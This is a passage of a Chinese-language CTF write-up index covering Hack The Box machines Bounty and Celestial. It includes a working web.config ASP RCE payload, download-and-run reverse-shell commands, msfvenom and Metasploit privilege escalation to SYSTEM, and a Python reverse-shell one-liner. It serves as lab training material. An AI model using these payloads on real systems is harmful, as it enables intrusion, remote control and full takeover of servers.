rce\uff0c\u53ef\u4ee5\u770b\u770b\u8fd9\u4e24\u7bc7\u6587\u7ae0\uff1a</p> <p>Upload a web.config File for Fun &amp; Profit</p> <p>\u901a\u8fc7\u4e0a\u4f20 web.config \u8fdb\u884c RCE</p> <p>\u5982\u4f55\u7b80\u5355\u7406\u89e3\u5462\uff1f\u4e0a\u4f20 .htaccess \u6587\u4ef6\u4ee5\u7ed5\u8fc7\u4e0a\u4f20\u6587\u4ef6\u7684\u4fdd\u62a4\u662f\u4e00\u79cd\u5df2\u77e5\u6280\u672f\uff0c\u5728\u8fd9\u91cc\u4e0a\u4f20web.config\u7684\u4f5c\u7528\u548c.htaccess\u7c7b\u4f3c\u3002\u6709\u65f6 IIS \u652f\u6301 ASP \u6587\u4ef6\uff0c\u4f46\u65e0\u6cd5\u4e0a\u4f20\u4efb\u4f55\u6269\u5c55\u540d\u4e3a .ASP \u7684\u6587\u4ef6\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528web.config\u6587\u4ef6\u6765\u8fd0\u884cASP\u7ecf\u5178\u4ee3\u7801\u3002</p> <p>\u4ec0\u4e48\u662f web.config \u6587\u4ef6\uff1f</p> <p>web.config \u6587\u4ef6\u662f\u7528\u4e8e\u914d\u7f6e ASP.NET \u7f51\u7ad9\u6216 Web \u5e94\u7528\u7a0b\u5e8f\u7684 XML \u683c\u5f0f\u914d\u7f6e\u6587\u4ef6\u3002\u5b83\u901a\u5e38\u4f4d\u4e8e\u7f51\u7ad9\u7684\u6839\u76ee\u5f55\u4e2d\uff0c\u5e76\u5305\u542b\u4e86\u8bb8\u591a\u914d\u7f6e\u8bbe\u7f6e\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u8fde\u63a5\u5b57\u7b26\u4e32\u3001\u4f1a\u8bdd\u72b6\u6001\u914d\u7f6e\u3001\u8eab\u4efd\u9a8c\u8bc1\u8bbe\u7f6e\u3001\u6388\u6743\u89c4\u5219\u3001\u9519\u8bef\u5904\u7406\u65b9\u5f0f\u4ee5\u53ca\u5176\u4ed6\u4e0e\u7f51\u7ad9\u529f\u80fd\u76f8\u5173\u7684\u8bbe\u7f6e\u3002\u901a\u8fc7\u7f16\u8f91 web.config \u6587\u4ef6\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5bf9\u7f51\u7ad9\u7684\u884c\u4e3a\u8fdb\u884c\u5e7f\u6cdb\u7684\u8c03\u6574\u548c\u5b9a\u5236\uff0c\u800c\u65e0\u9700\u4fee\u6539\u6e90\u4ee3\u7801\u3002</p>"},{"location":"CTF/HTB/Windows-Bounty/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u4e0a\u4f20\u4e00\u4e2aweb.config\u6587\u4ef6\uff0c\u5728\u6ce8\u91ca\u91cc\u6267\u884casp\u4ee3\u7801</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n   &lt;system.webServer&gt;\n      &lt;handlers accessPolicy=\"Read, Script, Write\"&gt;\n         &lt;add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" /&gt;\n      &lt;/handlers&gt;\n      &lt;security&gt;\n         &lt;requestFiltering&gt;\n            &lt;fileExtensions&gt;\n               &lt;remove fileExtension=\".config\" /&gt;\n            &lt;/fileExtensions&gt;\n            &lt;hiddenSegments&gt;\n               &lt;remove segment=\"web.config\" /&gt;\n            &lt;/hiddenSegments&gt;\n         &lt;/requestFiltering&gt;\n      &lt;/security&gt;\n   &lt;/system.webServer&gt;\n   &lt;appSettings&gt;\n&lt;/appSettings&gt;\n&lt;/configuration&gt;\n&lt;!\u2013-\n&lt;% Response.write(\"-\"&amp;\"-&gt;\")\nResponse.write(\"&lt;pre&gt;\")\nSet wShell1 = CreateObject(\"WScript.Shell\")\nSet cmd1 = wShell1.Exec(\"ipconfig\")\noutput1 = cmd1.StdOut.Readall()\nset cmd1 = nothing: Set wShell1 = nothing\nResponse.write(output1)\nResponse.write(\"&lt;/pre&gt;&lt;!-\"&amp;\"-\") %&gt;\n\n-\u2013&gt;\n</code></pre> <p>\u4e0a\u9762\u6587\u4ef6\u4e0a\u4f20\u4ee5\u540e\u8bbf\u95ee<code>http://10.10.10.93/uploadedfiles/web.config</code>\u6210\u529f\u6253\u5370<code>ipconfig</code>\u547d\u4ee4</p> <pre><code>Windows IP Configuration\n\nEthernet adapter Local Area Connection:\n\n   Connection-specific DNS Suffix  . : \n   IPv4 Address. . . . . . . . . . . : 10.10.10.93\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.10.10.2\n\nTunnel adapter isatap.{27C3F487-28AC-4CE6-AE3A-1F23518EF7A7}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n</code></pre>"},{"location":"CTF/HTB/Windows-Bounty/index.html#shell","title":"\u53cd\u5f39shell","text":"<p>PowerShell\u7684\u53cd\u5f39shell\u548cLinux\u4e2d\u7684bash\u53cd\u5f39shell\u6709\u4ec0\u4e48\u533a\u522b?</p> <ol> <li>\u8bed\u6cd5\u5dee\u5f02\uff1a</li> </ol> <p>PowerShell \u4f7f\u7528\u5bf9\u8c61\u7ba1\u9053\uff08Object Pipeline\uff09\u6765\u5904\u7406\u6570\u636e\uff0c\u5141\u8bb8\u5c06\u5bf9\u8c61\u4f20\u9012\u7ed9\u547d\u4ee4\u4ee5\u53ca\u4ece\u547d\u4ee4\u4e2d\u63a5\u6536\u5bf9\u8c61\u3002\u8fd9\u4f7f\u5f97 PowerShell \u53ef\u4ee5\u76f4\u63a5\u5904\u7406\u548c\u64cd\u4f5c .NET \u5bf9\u8c61\u3002 Bash \u5219\u662f\u57fa\u4e8e\u6587\u672c\u6d41\u7684\uff0c\u901a\u5e38\u4f7f\u7528\u7ba1\u9053\u5c06\u6587\u672c\u4f20\u9012\u7ed9\u547d\u4ee4\u3002\u5b83\u5904\u7406\u6587\u672c\u8f93\u5165\u548c\u8f93\u51fa\uff0c\u4e0d\u652f\u6301\u76f4\u63a5\u64cd\u4f5c\u5bf9\u8c61\u3002 2. \u547d\u4ee4\u548c\u51fd\u6570\uff1a PowerShell \u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u547d\u4ee4\u548c\u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u5904\u7406\u5bf9\u8c61\u3001\u64cd\u4f5c\u6587\u4ef6\u7cfb\u7edf\u3001\u7ba1\u7406\u8fdb\u7a0b\u7b49\u3002\u5b83\u5177\u6709\u4e30\u5bcc\u7684\u529f\u80fd\u548c\u6269\u5c55\u6027\u3002 Bash \u4e5f\u63d0\u4f9b\u4e86\u4e30\u5bcc\u7684\u547d\u4ee4\u548c\u51fd\u6570\uff0c\u4f46\u76f8\u8f83\u4e8e PowerShell\uff0c\u5b83\u66f4\u4e13\u6ce8\u4e8e\u6587\u672c\u5904\u7406\u548c\u7cfb\u7edf\u7ea7\u64cd\u4f5c\u3002 3. \u8de8\u5e73\u53f0\u6027\uff1a PowerShell \u6700\u521d\u662f\u4e3a Windows \u5e73\u53f0\u8bbe\u8ba1\u7684\uff0c\u867d\u7136\u5728\u6700\u8fd1\u7684\u7248\u672c\u4e2d\u589e\u52a0\u4e86\u5bf9 Linux \u548c macOS \u7684\u652f\u6301\uff0c\u4f46\u5b83\u7684\u4e3b\u8981\u7528\u6237\u7fa4\u4f53\u4ecd\u7136\u662f Windows \u7528\u6237\u3002 Bash \u662f Linux \u548c\u7c7b Unix \u7cfb\u7edf\u7684\u6807\u51c6 shell\uff0c\u51e0\u4e4e\u6240\u6709\u7684 Linux \u53d1\u884c\u7248\u90fd\u9ed8\u8ba4\u5b89\u88c5\u4e86\u5b83\uff0c\u56e0\u6b64\u5b83\u5728\u8de8\u5e73\u53f0\u65b9\u9762\u66f4\u5177\u4f18\u52bf\u3002</p> <p>\u53c2\u8003\u94fe\u63a5:[Powershell\u53cd\u5f39shell]</p> <p>Nishanghttps://github.com/samratashok/nishang\u662f\u4e00\u4e2a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6846\u67b6\uff0c\u96c6\u5408\u4e86\u4e00\u4e9bPowerShell\u653b\u51fb\u811a\u672c\u548c\u6709\u6548\u8f7d\u8377\uff0c\u53ef\u53cd\u5f39TCP/ UDP/ HTTP/HTTPS/ ICMP\u7b49\u7c7b\u578bshell\u3002</p> <p>\u9996\u5148\uff0c\u83b7\u53d6 Nishang \u7684 Invoke-PowerShellTcp.ps1 \u7684\u526f\u672c\u3002\u7136\u540e\u5728\u672b\u5c3e\u6dfb\u52a0\u4e00\u884c\u4ee5\u8c03\u7528\u5bf9\u6211\u7684\u56de\u8c03\u3002</p> <pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4242\n</code></pre> <p>\u628aweb.config\u7f16\u8f91\u6210\u4ee5\u4e0bpayload</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n   &lt;system.webServer&gt;\n      &lt;handlers accessPolicy=\"Read, Script, Write\"&gt;\n         &lt;add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" /&gt;\n      &lt;/handlers&gt;\n      &lt;security&gt;\n         &lt;requestFiltering&gt;\n            &lt;fileExtensions&gt;\n               &lt;remove fileExtension=\".config\" /&gt;\n            &lt;/fileExtensions&gt;\n            &lt;hiddenSegments&gt;\n               &lt;remove segment=\"web.config\" /&gt;\n            &lt;/hiddenSegments&gt;\n         &lt;/requestFiltering&gt;\n      &lt;/security&gt;\n   &lt;/system.webServer&gt;\n   &lt;appSettings&gt;\n&lt;/appSettings&gt;\n&lt;/configuration&gt;\n&lt;!\u2013-\n&lt;% Response.write(\"-\"&amp;\"-&gt;\")\nResponse.write(\"&lt;pre&gt;\")\nSet wShell1 = CreateObject(\"WScript.Shell\")\nSet cmd1 = wShell1.Exec(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1')\")\noutput1 = cmd1.StdOut.Readall()\nset cmd1 = nothing: Set wShell1 = nothing\nResponse.write(output1)\nResponse.write(\"&lt;/pre&gt;&lt;!-\"&amp;\"-\") %&gt;\n\n-\u2013&gt;\n</code></pre> <p>cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1'\uff1a</p> <ol> <li>cmd.exe /c: \u8fd9\u90e8\u5206\u542f\u52a8\u4e86 Windows \u547d\u4ee4\u63d0\u793a\u7b26\uff08cmd.exe\uff09\u5e76\u6267\u884c /c \u53c2\u6570\u6307\u5b9a\u7684\u547d\u4ee4\u3002/c \u53c2\u6570\u544a\u8bc9 cmd.exe \u5728\u6267\u884c\u5b8c\u6307\u5b9a\u7684\u547d\u4ee4\u540e\u5173\u95ed\u547d\u4ee4\u63d0\u793a\u7b26\u7a97\u53e3\u3002</li> <li>powershell.exe: \u8fd9\u90e8\u5206\u542f\u52a8\u4e86 PowerShell \u7a0b\u5e8f\u3002</li> <li>-c: \u8fd9\u662f PowerShell \u7684\u53c2\u6570\uff0c\u8868\u793a\u540e\u9762\u8ddf\u7740\u7684\u662f\u4e00\u6761\u547d\u4ee4\u3002</li> <li>iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1'): \u8fd9\u662f PowerShell \u547d\u4ee4\u3002iex \u662f Invoke-Expression \u7684\u7b80\u5199\uff0c\u5b83\u7528\u4e8e\u6267\u884c\u4ece\u5b57\u7b26\u4e32\u4e2d\u6784\u5efa\u7684\u547d\u4ee4\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0ciex \u7528\u4e8e\u6267\u884c\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u7684 PowerShell \u811a\u672c\u3002new-object net.webclient \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684 .NET WebClient \u5bf9\u8c61\uff0c\u7136\u540e downloadstring \u65b9\u6cd5\u7528\u4e8e\u4ece\u6307\u5b9a\u7684 URL \u4e0b\u8f7d\u5b57\u7b26\u4e32\uff08\u5373\u8fdc\u7a0b\u811a\u672c\u7684\u5185\u5bb9\uff09\u3002\u6574\u4e2a\u8868\u8fbe\u5f0f\u7684\u76ee\u7684\u662f\u4e0b\u8f7d\u8fdc\u7a0b\u811a\u672c\u5185\u5bb9\u3002</li> <li>'http://10.10.14.3/Invoke-PowerShellTcp.ps1': \u8fd9\u662f\u8fdc\u7a0b PowerShell \u811a\u672c\u7684 URL \u5730\u5740\uff0c\u5b83\u5c06\u88ab\u4e0b\u8f7d\u5e76\u6267\u884c\u3002</li> </ol> <p>\u56e0\u6b64\uff0c\u6574\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u4ece http://10.10.14.3/Invoke-PowerShellTcp.ps1 \u4e0b\u8f7d PowerShell \u811a\u672c\u5e76\u6267\u884c\u5b83\uff0c\u4ece\u800c\u5efa\u7acb\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u7684 TCP \u8fde\u63a5\uff0c\u63d0\u4f9b\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684 PowerShell shell\u3002</p> <p>\u5728\u672c\u5730\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff0c\u51c6\u5907\u4f20\u9001Invoke-PowerShellTcp.ps1</p> <pre><code>python3 -m http.server 80\n</code></pre> <p>kali\u5f00\u542f\u76d1\u542c\u63a5\u6536\u53cd\u5f39shell</p> <pre><code>nc -lnvp 4242\n</code></pre> <p>\u4e0a\u4f20\u4ee5\u540e\uff0c\u6253\u5f00http://10.10.10.93/uploadedfiles/web.config\u9875\u9762\uff0c\u62ff\u5230\u521d\u59cbshell</p> <pre><code>root@kali# nc -lnvp 4242              \nlistening on [any] 4242 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49158\nWindows PowerShell running as user BOUNTY$ on BOUNTY\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\windows\\system32\\inetsrv&gt;whoami\nbounty\\merlin\n</code></pre>"},{"location":"CTF/HTB/Windows-Bounty/index.html#_3","title":"\u63d0\u6743","text":"<p>webshell\u4e0d\u592a\u7a33\u5b9a\uff0c\u6211\u4eec\u7f16\u8bd1\u4e00\u4e2a\u7a33\u5b9a\u7684meterpreter</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe &gt; shell64.exe\n</code></pre> <p>\u5728\u9776\u673a\u4f9d\u6b21\u6267\u884c\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\uff0c\u628ashell\u4e0b\u8f7d\u5230\u9776\u673a</p> <pre><code>$client = new-object System.Net.WebClient\n$client.DownloadFile('http://10.10.14.3:8000/shell64.exe', 'C:\\users\\merlin\\Desktop\\shell64.exe')\n</code></pre> <p></p> <p>\u53c2\u8003\u94fe\u63a5\uff1aPowerShell \u8bed\u6cd5</p> <p>powershell\u6267\u884cexe\u6587\u4ef6</p> <pre><code>&amp;\"C:\\users\\merlin\\Desktop\\shell64.exe\"\n</code></pre> <p>\u62ff\u5230meterpreter\u4ee5\u540e\uff0c\u628awinPEAS.bat \u4f20\u5230\u9776\u673a\uff0c\u679a\u4e3e\u63d0\u6743\u6f0f\u6d1e</p> <p>WinPEAS.bat \u7528\u4e8e\u641c\u7d22\u5728 Windows \u4e3b\u673a\u4e0a\u63d0\u5347\u6743\u9650\u7684\u53ef\u80fd\u8def\u5f84\u3002WinPEAS.bat \u662f\u4e3a\u4e0d\u652f\u6301 WinPEAS.exe \u7684 Windows \u7cfb\u7edf\u5236\u4f5c\u7684\u6279\u5904\u7406\u811a\u672c\uff0c\u9700\u8981\u76ee\u6807\u7cfb\u7edf\uff08.Net 4\uff09\u73af\u5883\uff0c\u4e0d\u652f\u6301\u6253\u5370\u8f93\u51fa\u989c\u8272\u3002\u5982\u679c\u8981\u641c\u7d22\u53ef\u80fd\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6\u548c\u6ce8\u518c\u8868\uff0c\u9700\u8981\u5728 WinPEAS.bat \u811a\u672c\u5f00\u5934\u7684long\u53d8\u91cf\u8bbe\u7f6e\u4e3a yes \u3002</p> <p>WinPEAS.bat\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.ddosi.org/peass-ng/#%E2%91%A0WinPEAS%E7%94%A8%E6%B3%95%E5%8F%8A%E8%AF%B4%E6%98%8E</p> <p>WinPEAS.bat\u4f7f\u7528\u5730\u5740\uff1ahttps://cloud.tencent.com/developer/article/2149150</p> <pre><code>\"Microsoft Windows Server 2008 R2 Datacenter \"                                                                                                                                                                                              \n   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                                                                                                                                           \nMS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                                                                                                                                                     \nMS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                                                                                                                                                  \nMS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                                                                                                                                               \nMS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                                                                                                                                                 \nMS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                                                                                                                                              \nMS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                                                                                                                                                   \nMS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                                                                                                                                                 \nMS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                                                                                                                                              \nMS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                                                                                                                                                    \nMS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                                                                                                                                                     \nMS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                                                                                                                                                      \nMS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                                                                                                                                                       \nMS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                                                                                                                                                       \nMS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                                                                                                                                                    \nMS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                                                                                                                                                 \nMS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                                                                                                                                                      \nMS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                                                                                                                                               \nMS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                                                                                                                                                   \nMS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                                                                                                                                                \nMS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                                                                                                                                                 \nMS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                                                                                                                                             \nMS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                                                                                                                                               \nMS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                                                                                                                                                   \nMS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)\n</code></pre> <p>\u53ef\u4ee5\u770b\u89c1\u9776\u673a\u5f88\u591a\u8865\u4e01\u6ca1\u6709\u5b89\u88c5\uff0c\u9010\u4e2a\u679a\u4e3e\uff0c\u4f7f\u7528MS10-092</p> <pre><code>msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) &gt; search MS10-092\n\nMatching Modules\n================\n\n   #  Name                                        Disclosure Date  Rank       Check  Description\n   -  ----                                        ---------------  ----       -----  -----------\n   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation\n\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms10_092_schelevator\n</code></pre> <pre><code>msf6 exploit(windows/local/ms10_092_schelevator) &gt; run\n\n[*] Started reverse TCP handler on 10.10.14.3:4444 \n[*] Preparing payload at C:\\Windows\\TEMP\\AoTizOUxSB.exe\n[*] Creating task: LXJM4TwyEqICqyv\n[*] SUCCESS: The scheduled task \"LXJM4TwyEqICqyv\" has successfully been created.\n[*] SCHELEVATOR\n[*] Reading the task file contents from C:\\Windows\\system32\\tasks\\LXJM4TwyEqICqyv...\n[*] Original CRC32: 0x866f314a\n[*] Final CRC32: 0x866f314a\n[*] Writing our modified content back...\n[*] Validating task: LXJM4TwyEqICqyv\n[*] \n[*] Folder: \\\n[*] TaskName                                 Next Run Time          Status         \n[*] ======================================== ====================== ===============\n[*] LXJM4TwyEqICqyv                          1/1/2022 5:38:00 AM    Ready          \n[*] SCHELEVATOR\n[*] Disabling the task...\n[*] SUCCESS: The parameters of scheduled task \"LXJM4TwyEqICqyv\" have been changed.\n[*] SCHELEVATOR\n[*] Enabling the task...\n[*] SUCCESS: The parameters of scheduled task \"LXJM4TwyEqICqyv\" have been changed.\n[*] SCHELEVATOR\n[*] Executing the task...\n[*] Sending stage (175174 bytes) to 10.10.10.93\n[*] SUCCESS: Attempted to run the scheduled task \"LXJM4TwyEqICqyv\".\n[*] SCHELEVATOR\n[*] Deleting the task...\n[*] Meterpreter session 2 opened (10.10.14.3:4444 -&gt; 10.10.10.93:49175) at 2021-12-20 22:38:40 -0500\n[*] SUCCESS: The scheduled task \"LXJM4TwyEqICqyv\" was successfully deleted.\n[*] SCHELEVATOR\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre> <p>\u5df2\u7ecf\u62ff\u5230SYSTEM\u6743\u9650\uff0c\u81f3\u6b64\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u7cfb\u7edf\u5185\u4efb\u4f55\u6587\u4ef6\u3002</p>"},{"location":"CTF/HTB/Windows-Bounty/index.html#_4","title":"\u603b\u7ed3","text":"<p>\u672c\u6587\u6e17\u900f\u7684\u662fwindows\u4e3b\u673a\uff0cnmap\u626b\u63cf\u51fa\u4e2d\u95f4\u4ef6\u662fIIS7.5\uff0c\u901a\u8fc7\u7f51\u9875\u4fe1\u606f\u77e5\u9053\u9776\u673a\u8fd0\u884caspx\u7a0b\u5e8f</p> <p>\u7206\u7834\u65f6\u9009\u62e9\u5b57\u5178\u6307\u5b9a\u4e86\u6269\u5c55\u540daspx</p> <p>\u5f53\u5f97\u77e5\u6709\u4e00\u4e2a\u4e0a\u4f20\u70b9\u65f6\uff0c\u4f18\u5148\u9700\u8981\u77e5\u9053\u4e2d\u95f4\u4ef6\u7684\u89e3\u6790\u6f0f\u6d1e\u4fe1\u606f\uff0c\u4ee5\u53carce\u5229\u7528\u4fe1\u606f</p> <p>\u901a\u8fc7rce\u5f97\u5230\u521d\u59cbshell</p> <p>\u63d0\u6743\u7684\u65f6\u5019\uff0c\u770b\u5230\u521d\u59cb\u7528\u6237\u5f00\u542f\u4e86<code>SeImpersonatePrivilege</code>,\u4e5f\u53ef\u4ee5\u8003\u8651\u7528potato\u63d0\u6743</p> <p>nishang\u6846\u67b6\u662f\u4ec0\u4e48\uff1a</p> <p>Nishang\u662f\u4e00\u4e2aPowerShell\u653b\u51fb\u6846\u67b6\uff0c\u5b83\u662fPowerShell\u653b\u51fb\u811a\u672c\u548c\u6709\u6548\u8f7d\u8377\u7684\u4e00\u4e2a\u96c6\u5408\u3002</p> <p>\u9879\u76ee\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/samratashok/nishang</p> <p>Nishang powershell\u6846\u67b6\u2014\u2014\u4f7f\u7528\u6559\u7a0b\uff1ahttps://blog.csdn.net/weixin_40412037/article/details/115510209</p> <p>Windows\u5b89\u5168\u4e4bpowershell\u53cd\u5f39shell\uff1ahttps://blog.csdn.net/qq1113673178/article/details/123888025</p>"},{"location":"CTF/HTB/Windows-Celestial/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Celestial/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.85 -oA scans/ports\n...\nPORT     STATE SERVICE VERSION\n3000/tcp open  http    Node.js Express framework\n|_http-title: Site doesn't have a title (text/html; charset=utf-8).\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Celestial/index.html#web-port-3000","title":"Web - port 3000","text":"<p>\u5c31\u5f00\u4e86\u4e2a3000\u7aef\u53e3\uff0c\u8bbf\u95ee\u770b\u770b</p> <p></p> <pre><code>HTTP/1.1 200 OK\nX-Powered-By: Express\nSet-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Mon, 02 Apr 2018 00:47:44 GMT; HttpOnly\nContent-Type: text/html; charset=utf-8\nContent-Length: 12\nETag: W/\"c-8lfvj2TmiRRvB7K+JPws1w9h6aY\"\nDate: Mon, 02 Apr 2018 00:32:44 GMT\nConnection: close\n\n&lt;h1&gt;404&lt;/h1&gt;\n</code></pre> <p>\u5237\u65b0\u65f6\uff0c\u9875\u9762\u5c06\u8fd4\u56de\uff1a</p> <p></p> <pre><code>HTTP/1.1 200 OK\nX-Powered-By: Express\nContent-Type: text/html; charset=utf-8\nContent-Length: 21\nETag: W/\"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg\"\nDate: Mon, 02 Apr 2018 00:33:59 GMT\nConnection: close\n\nHey Dummy 2 + 2 is 22\n</code></pre> <p>\u53ef\u4ee5\u6ce8\u610f\u5230\uff1acookie\u662f base64 \u7f16\u7801\u7684\u3002</p> <p></p>"},{"location":"CTF/HTB/Windows-Celestial/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":"<p>\u4f7f\u7528bp\u6293\u5305\u4fee\u6539\u8bf7\u6c42\u5305\u5e76\u67e5\u770b\u3002</p> <p></p> <p>\u968f\u4fbf\u6539\u4e2a\u6570\u5b573\u5728burpsuite\u4e0a\u914d\u7f6e\u7f16\u7801\u4e3abase64\u5f97\u5230\u5982\u4e0b\u62a5\u9519\u4fe1\u606f</p> <p></p> <p>\u770b\u663e\u793a\u662f\u8ddfnodejs\u6709\u5173\uff0c\u641c\u7d22\u4e86\u4e0b\u5bf9\u5e94\u540d\u79f0\u662f\u5426\u542b\u6709\u6f0f\u6d1e\uff0c\u786e\u8ba4\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u53c2\u8003\u94fe\u63a5\uff1ahttps://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</p> <p>\u518d\u641c\u7d22\u4e0bexploit \uff0c\u5177\u4f53exploit\u5730\u5740\uff1ahttps://hd7exploit.wordpress.com/2017/05/29/exploiting-node-js-deserialization-bug-for-remote-code-execution-cve-2017-5941/</p> <p>exploit\u4ee3\u7801\uff1ahttps://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py.</p> <p>\u5177\u4f53\u64cd\u4f5c\u5982\u4e0b\uff1a</p> <p></p> <p></p> <p>\u6210\u529f\u53cd\u5f39shell\uff0c\u83b7\u53d6\u4e86user.txt\u4fe1\u606f\uff0c\u5c1d\u8bd5\u63d0\u6743\uff0c\u6267\u884c\u4e86sudo -l\u9700\u8981\u65e0\u679c\uff0c\u770b\u5230\u5f53\u524d\u76ee\u5f55\u542b\u6709\u4e00\u4e2a\u811a\u672c</p> <p></p> <p>\u663e\u793a\u811a\u672c\u662f\u5728\u8fd0\u884c\uff0c\u4e0b\u8f7dpspy\u5230\u76ee\u6807\u9776\u673a\u6267\u884c\u5f97\u5230\u5982\u4e0b\u7ed3\u679c.</p> <p>https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1</p> <p></p> <p>\u786e\u8ba4\u6587\u4ef6script.py\u53ef\u4ee5\u5199\u5165\u6587\u4ef6\uff0c\u4f7f\u7528vi\u7f16\u8f91\u5668\u5199\u5165\u53cd\u5f39\u4ee3\u7801</p> <pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.5\",8844));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n</code></pre> <p>\u7b49\u5f85\u53cd\u5f39shell\uff0c\u5dee\u4e0d\u591a\u7b49\u4e865-10\u5206\u949f\u6210\u529f\u53cd\u5f39shell</p> 